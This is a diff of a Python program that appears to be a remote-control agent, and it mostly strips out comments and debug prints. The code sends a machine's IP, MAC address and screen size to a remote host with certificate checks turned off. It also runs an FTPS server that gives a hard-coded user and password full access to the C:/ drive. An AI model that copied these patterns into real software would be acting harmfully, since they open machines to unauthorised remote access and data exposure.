@@ -58,31 +58,19 @@ def start_listening_for_commands(running_port):
 
 
 def send_computer_information(running_port):
-    #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    #context.load_verify_locations('../certificates2/server.crt')
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        # with context.wrap_socket(sock, server_hostname="HOST") as ssock:
-        """ssl_sock = ssl.wrap_socket(sock,
-                                   ca_certs="../certificates2/server.crt",
-                                   cert_reqs=ssl.CERT_REQUIRED)"""
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
-
         context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
-
         ssl_sock = context.wrap_socket(sock, server_hostname=HOST)
         ssl_sock.connect((HOST, PORT))
-        print("connected")
+
         ip_address = return_ip_address()
-        print(ip_address)
         mac_address = gma()
-        print(mac_address)
         width, height = get_screen_width_height()
-        print(width, height)
+
         data_to_send = [ip_address, str(running_port), mac_address, str(width), str(height)]
-        print(data_to_send)
         encoded_data = '||'.join(data_to_send).encode()
         ssl_sock.sendall(encoded_data)
         ssl_sock.close()
@@ -256,9 +244,6 @@ def process_list_service(host, port):
 def ftps_server_start(conn, ipaddress, port):
     authorizer = DummyAuthorizer()
     authorizer.add_user("Shw", "Pracc999.", "C:/", perm="elradfmw")
-    #authorizer.remove_user("anonymous")
-    #authorizer = WindowsAuthorizer(allowed_users=["Shw"])
-    #authorizer.override_user("Shw", homedir='C:/', perm="elradfmw")
     handler = pyftpdlib.handlers.TLS_FTPHandler
     handler.certfile = 'keycert.pem'
     handler.authorizer = authorizer
